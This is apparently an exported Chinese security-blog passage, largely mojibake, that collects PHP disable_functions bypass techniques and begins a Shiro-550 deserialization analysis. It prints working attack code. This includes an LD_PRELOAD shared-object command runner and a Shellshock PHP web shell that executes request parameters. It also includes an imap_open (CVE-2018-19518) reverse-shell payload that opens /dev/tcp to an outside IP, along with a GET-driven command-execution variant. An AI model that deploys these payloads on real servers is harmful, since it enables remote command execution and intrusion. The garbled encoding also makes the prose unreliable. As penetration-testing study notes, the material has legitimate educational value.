<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    // get command line options and arg</span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line"></span><br><span class="line">    // unset environment variable LD_PRELOAD.</span><br><span class="line">    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br><span class="line">    // distribution (e.g., centos), I need crafty trick.</span><br><span class="line">    int i;</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &apos;\0&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // executive command</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å°† bypass_disablefunc.c ç¼–è¯‘ä¸ºå…±äº«å¯¹è±¡ bypass_disablefunc_x64.soï¼š<code>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so</code>ï¼Œè‹¥è¦ç¼–è¯‘æˆX86æ¶æ„éœ€è¦åŠ ä¸Š-m32é€‰é¡¹</p>
</li>
<li><p>ä¸Šä¼  bypass_disablefunc_x64.soå’Œbypass_disablefunc.phpè„šæœ¬ï¼ŒæŒ‰bypass_disablefunc.phpä¸­æç¤ºè¿›è¡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
</li>
</ul>
<p><img src="/images/php-about/disable_function/bypass_disablefunc_shell.png" alt="bypass_disablefunc_shell"></p>
<ul>
<li>æ¥è‡ªyangyangwithgnuå¤§ä½¬çš„è„šæœ¬<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener"> bypass_disablefunc_via_LD_PRELOAD</a><ul>
<li>bypass_disablefunc.php</li>
<li>bypass_disablefunc.c</li>
<li>bypass_disablefunc_x64.so</li>
</ul>
</li>
<li>â–² æœ¬å®éªŒæ˜¯é€šè¿‡mail()å‡½æ•°å»åŠ è½½soæ–‡ä»¶çš„ï¼Œä½†å¹¶ä¸åªå‰©å•å•mail()å‡½æ•°ä¸€ä¸ªï¼Œæ­¤é“¾æ¥<a href="https://www.anquanke.com/post/id/197745#h3-11" target="_blank" rel="noopener">PHP çªç ´ disable_functions å¸¸ç”¨å§¿åŠ¿ä»¥åŠä½¿ç”¨ Fuzz æŒ–æ˜å«å†…éƒ¨ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°</a> &amp;&amp; <a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/" target="_blank" rel="noopener">Fuzzer gets us new functions to bypass PHP disable_functions</a> ä»‹ç»åˆ°äº†æ›´å¤šfuzzå†…éƒ¨ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°çš„åŸç†ä»¥åŠè„šæœ¬</li>
</ul>
<h3 id="0X03-PHP-5-x-Shellshock-Exploit-bypass-disable-functions"><a href="#0X03-PHP-5-x-Shellshock-Exploit-bypass-disable-functions" class="headerlink" title="0X03 PHP 5.x Shellshock Exploit (bypass disable_functions)"></a>0X03 PHP 5.x Shellshock Exploit (bypass disable_functions)</h3><h5 id="å½±å“ç‰ˆæœ¬ï¼šPHP-lt-5-6-2-â€“-â€˜Shellshockâ€™-Safe-Mode-Disable-Functions-Bypass-Command-Injection"><a href="#å½±å“ç‰ˆæœ¬ï¼šPHP-lt-5-6-2-â€“-â€˜Shellshockâ€™-Safe-Mode-Disable-Functions-Bypass-Command-Injection" class="headerlink" title="å½±å“ç‰ˆæœ¬ï¼šPHP &lt; 5.6.2 â€“ â€˜Shellshockâ€™ Safe Mode / Disable Functions Bypass / Command Injection"></a>å½±å“ç‰ˆæœ¬ï¼šPHP &lt; 5.6.2 â€“ â€˜Shellshockâ€™ Safe Mode / Disable Functions Bypass / Command Injection</h5><h5 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h5><ul>
<li>Linux Web Serverä¸€èˆ¬å¯ä»¥æä¾›CGIæ¥å£ï¼Œå…è®¸è¿œç¨‹æ‰§è¡ŒBashå‘½ä»¤</li>
<li>å¯¹äºHTTPå¤´éƒ¨ï¼ŒCGIè„šæœ¬è§£æå™¨ä¼šå°†å…¶å½“ä½œç¯å¢ƒå˜é‡ï¼Œè°ƒç”¨bashçš„envç›¸å…³å‡½æ•°è®¾ç½®åˆ°ä¸´æ—¶ç¯å¢ƒå˜é‡ä¸­</li>
<li>HTTPåè®®å…è®¸å‘é€ä»»æ„å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„HTTPå¤´éƒ¨</li>
<li>â–² è¿™æ ·å°±äº§ç”Ÿäº†ä¸€ä¸ªå®Œæ•´çš„å¯ä¾›Bashå‘½ä»¤æ³¨å…¥çš„åœºæ™¯ï¼Œå®¢æˆ·ç«¯æ•…æ„å‘é€æ„é€ å¥½çš„å¸¦æ”»å‡»å‘½ä»¤çš„HTTPå¤´éƒ¨åˆ°æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯è°ƒç”¨è®¾ç½®ç¯å¢ƒå˜é‡çš„å‡½æ•°ï¼Œç›´æ¥æ‰§è¡Œäº†å®¢æˆ·ç«¯æŒ‡å®šçš„å¤´éƒ¨é‡Œé¢çš„å‘½ä»¤ã€‚å¹¶ä¸”è¿˜ä¼šå°†ç»“æœä¸€å¹¶è¿”å›ç»™å®¢æˆ·ç«¯</li>
</ul>
<h5 id="exploit-dbä¸Šçš„è„šæœ¬-â€”-ç ´å£³æ¼æ´"><a href="#exploit-dbä¸Šçš„è„šæœ¬-â€”-ç ´å£³æ¼æ´" class="headerlink" title="exploit-dbä¸Šçš„è„šæœ¬  â€”  ç ´å£³æ¼æ´"></a><a href="https://www.exploit-db.com/exploits/35146" target="_blank" rel="noopener">exploit-dbä¸Šçš„è„šæœ¬</a>  â€”  ç ´å£³æ¼æ´</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)</span></span><br><span class="line"><span class="comment"># Google Dork: none</span></span><br><span class="line"><span class="comment"># Date: 10/31/2014</span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net</span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror</span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2)</span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6</span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271</span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"Disabled functions: "</span>.ini_get(<span class="string">'disable_functions'</span>).<span class="string">"n"</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span><span class="params">($cmd)</span> </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @ mail.c:283</span></span><br><span class="line">   <span class="keyword">if</span>(strstr(readlink(<span class="string">"/bin/sh"</span>), <span class="string">"bash"</span>) != <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">     $tmp = tempnam(<span class="string">"."</span>,<span class="string">"data"</span>);</span><br><span class="line">     putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1"</span>);</span><br><span class="line">     <span class="comment">// In Safe Mode, the user may only alter environment variables whose names</span></span><br><span class="line">     <span class="comment">// begin with the prefixes supplied by this directive.</span></span><br><span class="line">     <span class="comment">// By default, users will only be able to set environment variables that</span></span><br><span class="line">     <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive is empty,</span></span><br><span class="line">     <span class="comment">// PHP will let the user modify ANY environment variable!</span></span><br><span class="line">     mail(<span class="string">"a@127.0.0.1"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">"-bv"</span>); <span class="comment">// -bv so we don't actually send any mail</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"Not vuln (not bash)"</span>;</span><br><span class="line">   $output = @file_get_contents($tmp);</span><br><span class="line">   @unlink($tmp);</span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">""</span>) <span class="keyword">return</span> $output;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"No output, or not vuln."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>â–² 2020.08.25 æœ¬å®éªŒå› ç¯å¢ƒç¼ºä¹ï¼Œæš‚æ— è¿›è¡Œå®éªŒ</li>
</ul>
<h3 id="0X04-PHP-5-2-3-win32std-extension-safe-mode-and-bypass-disable-functions"><a href="#0X04-PHP-5-2-3-win32std-extension-safe-mode-and-bypass-disable-functions" class="headerlink" title="0X04 PHP 5.2.3 win32std extension safe_mode and bypass disable_functions"></a>0X04 PHP 5.2.3 win32std extension safe_mode and bypass disable_functions</h3><ul>
<li>â–² è„šæœ¬åè€ï¼Œé€‚ç”¨äºXPç³»åˆ—çš„ç³»ç»Ÿ</li>
</ul>
<p><a href="https://www.exploit-db.com/exploits/4218" target="_blank" rel="noopener">exploit-dbä¸Šçš„è„šæœ¬</a> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 5.2.3 win32std extension safe_mode and disable_functions protections bypass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//author: shinnai</span></span><br><span class="line"><span class="comment">//mail: shinnai[at]autistici[dot]org</span></span><br><span class="line"><span class="comment">//site: http://shinnai.altervista.org</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tested on xp Pro sp2 full patched, worked both from the cli and on apache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Thanks to rgod for all his precious advises :)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//I set php.ini in this way:</span></span><br><span class="line"><span class="comment">//safe_mode = On</span></span><br><span class="line"><span class="comment">//disable_functions = system</span></span><br><span class="line"><span class="comment">//if you launch the exploit from the cli, cmd.exe will be wxecuted</span></span><br><span class="line"><span class="comment">//if you browse it through apache, you'll see a new cmd.exe process activated in taskmanager</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!extension_loaded(<span class="string">"win32std"</span>)) <span class="keyword">die</span>(<span class="string">"win32std extension required!"</span>);</span><br><span class="line">system(<span class="string">"cmd.exe"</span>); <span class="comment">//just to be sure that protections work well</span></span><br><span class="line">win_shell_execute(<span class="string">"..\..\..\..\windows\system32\cmd.exe"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>â–² 2020.08.25 æœ¬å®éªŒå› ç¯å¢ƒç¼ºä¹ï¼Œæš‚æ— è¿›è¡Œå®éªŒ</p>
<h3 id="0X05-PHP-FPM-FastCGI-bypass-disable-function"><a href="#0X05-PHP-FPM-FastCGI-bypass-disable-function" class="headerlink" title="0X05 PHP-FPM/FastCGI bypass disable_function"></a>0X05 PHP-FPM/FastCGI bypass disable_function</h3><ul>
<li>â–² åŸºäºPHP-FPMçš„æœªæˆæƒèŒƒå›´æ¼æ´ï¼Œå¯è‡ªå®šä¹‰ä»»æ„ä»£ç æ‰§è¡Œã€</li>
<li>å‰æ<ul>
<li>tcpç›‘å¬æ–¹å¼ï¼Œç›‘å¬æ–¹å¼ä¸º0.0.0.0:9000</li>
<li>phpç»“åˆçš„æ–¹å¼ä¸ºfpm/FastCGI</li>
</ul>
</li>
<li>æ„é€ Pç‰›çš„è„šæœ¬ <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">fpm.pyå…¼å®¹py3å’Œpy2</a></li>
</ul>
<p><img src="/images/php-about/disable_function/php-fpm-bypass.png" alt="php-fpm-bypass"></p>
<h3 id="0X06-PHP-imap-open-RCEæ¼æ´ï¼ˆCVE-2018-19518ï¼‰"><a href="#0X06-PHP-imap-open-RCEæ¼æ´ï¼ˆCVE-2018-19518ï¼‰" class="headerlink" title="0X06 PHP imap_open RCEæ¼æ´ï¼ˆCVE-2018-19518ï¼‰"></a>0X06 PHP imap_open RCEæ¼æ´ï¼ˆCVE-2018-19518ï¼‰</h3><h5 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h5><ul>
<li><p>â–² éé»˜è®¤å®‰è£…çš„ç»„ä»¶</p>
</li>
<li><p>åœ¨æ²¡æœ‰ç¦ç”¨enable_insecure_rshé€‰é¡¹çš„æ¡ä»¶ä¸‹ï¼Œç”¨æˆ·é€šè¿‡ä¼ å…¥mailboxå‚æ•°å¯å¯¼è‡´rce</p>
</li>
<li><p>è¯¥æ¼æ´çš„å­˜åœ¨æ˜¯å› ä¸ºå—å½±å“çš„è½¯ä»¶çš„imap_openå‡½æ•°åœ¨å°†é‚®ç®±åç§°ä¼ é€’ç»™rshæˆ–sshå‘½ä»¤ä¹‹å‰ä¸æ­£ç¡®åœ°è¿‡æ»¤é‚®ç®±åç§°ã€‚å¦‚æœå¯ç”¨äº†rshå’ŒsshåŠŸèƒ½å¹¶ä¸”rshå‘½ä»¤æ˜¯sshå‘½ä»¤çš„ç¬¦å·é“¾æ¥ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘ç›®æ ‡ç³»ç»Ÿå‘é€åŒ…å«-oProxyCommandå‚æ•°çš„æ¶æ„IMAPæœåŠ¡å™¨åç§°æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚æˆåŠŸçš„æ”»å‡»å¯èƒ½å…è®¸æ”»å‡»è€…ç»•è¿‡å…¶ä»–ç¦ç”¨çš„exec å—å½±å“è½¯ä»¶ä¸­çš„åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¿™äº›åŠŸèƒ½åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„shellå‘½ä»¤</p>
</li>
<li><p>åå¼¹shell payload</p>
<ul>
<li>â–² 2020.08.29 è„šæœ¬ä¿®æ”¹åä¹Ÿæ— æ³•è¿›è¡Œåå¼¹</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.67.153/7777 0&gt;&amp;1"</span>;</span><br><span class="line">$base64 = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"x -oProxyCommand=echo\t"</span>.$base64.<span class="string">"|base64\t-d|sh&#125;"</span>;</span><br><span class="line">@imap_open(<span class="string">"&#123;"</span>.$server.<span class="string">"&#125;:143/imap&#125;INBOX"</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ä»£ç æ‰§è¡Œpayload</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'imap_open'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no imap_open function!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$server = <span class="string">"x -oProxyCommand=echo\t"</span> . base64_encode($_GET[<span class="string">'cmd'</span>] . <span class="string">"&gt;/tmp/cmd_result"</span>) . <span class="string">"|base64\t-d|sh&#125;"</span>;</span><br><span class="line"><span class="comment">//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . "&gt;/tmp/cmd_result") . '|base64$IFS$()-d|sh&#125;';</span></span><br><span class="line">imap_open(<span class="string">'&#123;'</span> . $server . <span class="string">':143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>); <span class="comment">// or var_dump("\n\nError: ".imap_last_error());</span></span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/tmp/cmd_result"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/disable_function/imap-code-execution.png" alt="imap-code-execution"></p>
<h3 id="0X07-åˆ©ç”¨PHP-bug-Bypass-disable-function"><a href="#0X07-åˆ©ç”¨PHP-bug-Bypass-disable-function" class="headerlink" title="0X07 åˆ©ç”¨PHP bug Bypass disable_function"></a>0X07 åˆ©ç”¨PHP bug Bypass disable_function</h3><ul>
<li>Exploitï¼š<a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">mmor1å¸ˆå‚…çš„exploits</a></li>
<li>åˆ©ç”¨ä¸‰ä¸ª PHP å†å²æ¼æ´æ¥ç»•è¿‡ disable_functions</li>
</ul>
<h5 id="Use-after-free-with-json-serializer"><a href="#Use-after-free-with-json-serializer" class="headerlink" title="Use after free with json serializer"></a>Use after free with json serializer</h5><ul>
<li>å‚è€ƒé“¾æ¥ï¼š<a href="https://bugs.php.net/bug.php?id=77843" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=77843</a></li>
<li>é€‚ç”¨ç›®æ ‡ï¼ˆ*nixç³»ç»Ÿï¼‰<ul>
<li>7.1 â€“ all versions to date</li>
<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
</ul>
</li>
<li>â–² 2020.08.29 å› å®éªŒç¯å¢ƒè¿‡é«˜ï¼Œæš‚æ— è¿›è¡Œå®éªŒ</li>
</ul>
<h5 id="Use-after-free-in-GC-with-Certain-Destructors"><a href="#Use-after-free-in-GC-with-Certain-Destructors" class="headerlink" title="Use after free in GC with Certain Destructors"></a>Use after free in GC with Certain Destructors</h5><ul>
<li>å‚è€ƒé“¾æ¥ï¼š<a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72530</a></li>
<li>é€‚ç”¨ç›®æ ‡ï¼ˆ*nixç³»ç»Ÿï¼‰<ul>
<li>7.0 â€“ all versions to date</li>
<li>7.1 â€“ all versions to date</li>
<li>7.2 â€“ all versions to date</li>
<li>7.3 â€“ all versions to date</li>
</ul>
</li>
</ul>
<p><img src="/images/php-about/disable_function/php-gc-bypass.png" alt="php-gc-bypass"></p>
<h5 id="Use-after-free-when-accessing-already-destructed-backtrace-arguments"><a href="#Use-after-free-when-accessing-already-destructed-backtrace-arguments" class="headerlink" title="Use-after-free when accessing already destructed backtrace arguments"></a><strong>Use-after-free when accessing already destructed backtrace arguments</strong></h5><ul>
<li>å‚è€ƒé“¾æ¥ï¼š<a href="https://bugs.php.net/bug.php?id=76047" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=76047</a></li>
<li>é€‚ç”¨ç›®æ ‡ï¼ˆ*nixç³»ç»Ÿï¼‰<ul>
<li>7.0 â€“ all versions to date</li>
<li>7.1 â€“ all versions to date</li>
<li>7.2 â€“ all versions to date</li>
<li>7.3 â€“ all versions to date</li>
</ul>
</li>
</ul>
<p><img src="/images/php-about/disable_function/php-backtrace-bypass.png" alt="php-backtrace-bypass"></p>
<h3 id="0X08-å…¶ä»–åˆ©ç”¨æ–¹æ³•"><a href="#0X08-å…¶ä»–åˆ©ç”¨æ–¹æ³•" class="headerlink" title="0X08 å…¶ä»–åˆ©ç”¨æ–¹æ³•"></a>0X08 å…¶ä»–åˆ©ç”¨æ–¹æ³•</h3><ul>
<li>FFIç»•è¿‡disable_function</li>
<li>Apache mod_cgi ä¿®æ”¹.htaccessç»•è¿‡é™åˆ¶</li>
<li>dl()å‡½æ•°ç»•è¿‡disable_functioné™åˆ¶</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="https://xz.aliyun.com/t/5320#toc-2" target="_blank" rel="noopener">PHP Webshellä¸‹ç»•è¿‡disable_functionçš„æ–¹æ³•</a></li>
<li><a href="https://blog.csdn.net/qq_41107295/article/details/98462891" target="_blank" rel="noopener">PHPç»•è¿‡disable_functioné™åˆ¶</a></li>
<li><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">æ— éœ€sendmailï¼šå·§ç”¨LD_PRELOADçªç ´disable_functions</a></li>
<li><a href="https://www.anquanke.com/post/id/197745#h3-11" target="_blank" rel="noopener">PHP çªç ´ disable_functions å¸¸ç”¨å§¿åŠ¿ä»¥åŠä½¿ç”¨ Fuzz æŒ–æ˜å«å†…éƒ¨ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°</a></li>
<li><a href="https://blog.csdn.net/fish43237/article/details/39609031" target="_blank" rel="noopener">ShellShockï¼ˆç ´å£³æ¼æ´ï¼‰çš„ç®€å•åˆ†æ</a></li>
<li><a href="https://evi1.cn/post/bypass_disable_func/" target="_blank" rel="noopener">Bypass disable_functions å­¦ä¹ ç¬”è®°</a></li>
<li><a href="http://www.91ri.org/8700.html" target="_blank" rel="noopener">Webshellä¸‹å‘½ä»¤æ‰§è¡Œé™åˆ¶åŠç»•è¿‡æ–¹æ³•</a></li>
</ul>
]]></content>
      <categories>
        <category>php-about</category>
      </categories>
  </entry>
  <entry>
    <title>Shiroååºåˆ—åŒ–æ¼æ´</title>
    <url>/2020/10/27/md%E6%96%87%E4%BB%B6/shiro_unserialize/</url>
    <content><![CDATA[<h2 id="Shiro-ååºåˆ—åŒ–æ¼æ´"><a href="#Shiro-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Shiro ååºåˆ—åŒ–æ¼æ´"></a>Shiro ååºåˆ—åŒ–æ¼æ´</h2><h3 id="0X00-Shiro-rememberMe-Shiro-550"><a href="#0X00-Shiro-rememberMe-Shiro-550" class="headerlink" title="0X00 Shiro rememberMe(Shiro-550)"></a>0X00 Shiro rememberMe(Shiro-550)</h3><blockquote>
<p>CVE-2016-4437</p>
</blockquote>
<h5 id="å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-2-4"><a href="#å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-2-4" class="headerlink" title="å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.2.4"></a>å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.2.4</h5><h5 id="ä¸€é”®åˆ©ç”¨å·¥å…·ï¼šShiroExploit"><a href="#ä¸€é”®åˆ©ç”¨å·¥å…·ï¼šShiroExploit" class="headerlink" title="ä¸€é”®åˆ©ç”¨å·¥å…·ï¼šShiroExploit"></a>ä¸€é”®åˆ©ç”¨å·¥å…·ï¼š<a href="https://github.com/feihong-cs/ShiroExploit" target="_blank" rel="noopener">ShiroExploit</a></h5><h5 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h5><ul>
<li>shiroåœ¨ç™»å½•å¤„æä¾›äº†Remember Meè¿™ä¸ªåŠŸèƒ½ï¼Œæ¥è®°å½•ç”¨æˆ·ç™»å½•çš„å‡­è¯ï¼Œç„¶åshiroä½¿ç”¨äº†CookieRememberMeManagerç±»å¯¹ç”¨æˆ·çš„ç™»é™†å‡­è¯ï¼Œä¹Ÿå°±æ˜¯Remember Meçš„å†…å®¹è¿›è¡Œä¸€ç³»åˆ—å¤„ç†ï¼š</li>
</ul>
<p><strong>ä½¿ç”¨Javaåºåˆ—åŒ– â€”&gt; ä½¿ç”¨å¯†é’¥è¿›è¡ŒAESåŠ å¯† â€”&gt; Base64åŠ å¯† â€”&gt; å¾—åˆ°åŠ å¯†åçš„Remember Meå†…å®¹</strong></p>
<ul>
<li>åŒæ—¶åœ¨è¯†åˆ«ç”¨æˆ·èº«ä»½çš„æ—¶å€™ï¼Œéœ€è¦å¯¹Remember Meçš„å­—æ®µè¿›è¡Œè§£å¯†ï¼Œè§£å¯†çš„é¡ºåºä¸ºï¼š</li>
</ul>
<p><strong>Remember MeåŠ å¯†å†…å®¹ â€”&gt; Base64è§£å¯† â€”&gt; ä½¿ç”¨å¯†é’¥è¿›è¡ŒAESè§£å¯† â€”&gt;Javaååºåˆ—åŒ–</strong></p>
<ul>
<li>â–² é—®é¢˜å‡ºåœ¨<strong>AESåŠ å¯†çš„å¯†é’¥Keyè¢«ç¡¬ç¼–ç åœ¨ä»£ç é‡Œ</strong>ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…åªè¦é€šè¿‡æºä»£ç æ‰¾åˆ°AESåŠ å¯†çš„å¯†é’¥ï¼Œå°±å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼ŒAESåŠ å¯†ï¼ŒBase64ç¼–ç ï¼Œç„¶åå°†å…¶ä½œä¸ºcookieçš„Remember Meå­—æ®µå‘é€ï¼ŒShiroå°†RememberMeè¿›è¡Œè§£å¯†å¹¶ä¸”ååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆååºåˆ—åŒ–æ¼æ´</li>
</ul>
<h5 id="æ¼æ´åŠ å¯†åˆ†æ"><a href="#æ¼æ´åŠ å¯†åˆ†æ" class="headerlink" title="æ¼æ´åŠ å¯†åˆ†æ"></a>æ¼æ´åŠ å¯†åˆ†æ</h5><ul>
<li>ç™»å½•<a href="http://localhost:8080/login.jsp" target="_blank" rel="noopener">http://localhost:8080/login.jsp</a> ï¼Œå‹¾é€‰rememberMeï¼Œç™»å½•æˆåŠŸåä¼šçœ‹åˆ°ä¸€ä¸ªkeyä¸ºrememberMeï¼Œvalueé•¿åº¦ä¸º512çš„Cookie</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rememberMe=WM0+3iRZaxl/mYdNM2vyqOvxRiJfMtqkfv2mJX6cLUZQFRnWcS5jVR+e43SeN+yeBoWiVDjFBDSNp5+YGf9y1av27VuG8bYwTOaHkFVkoeFKpJadtV0tAGxcpI9e4il6D9OHH6k7PcJCdtaUnLPGwqnRGGHZjD1M/ZM8KSawiHAfme9rKC0pxijJoMIaz9jSEaOmJnXDzBIAgnSkikJD9s5LO3fpNMHuaHCC8Hqcrna8vn5sEKD1jIlGxugTFWoyMeYQzVvIxhZbs8v5mJfTXFRSVmfH9FrotQqKCJLD3V8WFckEZdMQIYvozXuym1LGix0QaP9F7sjoCvNt953nwYiJHGoiOwpP/V2LjLY60usnFP+Qu+FKRYIjUrcCT6NyasQL4ehTpUZ3uoxp9NYy5sv/MsW5g335odrtzA03LOM0ZDXqHS/aAuPpO74RmN3K7aq3dzOpQrEY7CTfkKLbQjA3Iz9fzSYgxlq7UoXjkp5/E1cr7KRlLqv8Edr9uU0lWb5XU2Thp+mA4RlRbYetAg==</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-remember-cookie.png" alt="550-remember-cookie"></p>
<ul>
<li><p>å‡è®¾ä»¥adminç”¨æˆ·ç™»å½•ï¼Œç™»å½•æˆåŠŸçš„æƒ…å†µä¸‹ï¼Œshiroä¼šå…ˆå°†adminå­—ç¬¦ä¸²è¿›è¡Œåºåˆ—åŒ–ï¼Œä½¿ç”¨DefaultSerializerç±»çš„serializeç±»çš„serizlizeæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(principals); <span class="comment">// è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            bytes = encrypt(bytes); <span class="comment">// AESåŠ å¯†</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¤„ç†Cookieçš„ç±»  -&gt;  CookieRememberMeManaer</p>
<ul>
<li>ç»§æ‰¿AbstractRememberMeManagerç±»</li>
</ul>
</li>
<li><p>è·Ÿè¿›AbstractRememberMeManagerç±»  -&gt; ä»onSuccessfulLoginæ–¹æ³•ä¸‹æ–­ç‚¹ï¼Œdebugå°±å¯ä»¥çœ‹åˆ°é€»è¾‘</p>
<ul>
<li>å¾ˆå®¹æ˜“çœ‹åˆ°AESçš„Key</li>
</ul>
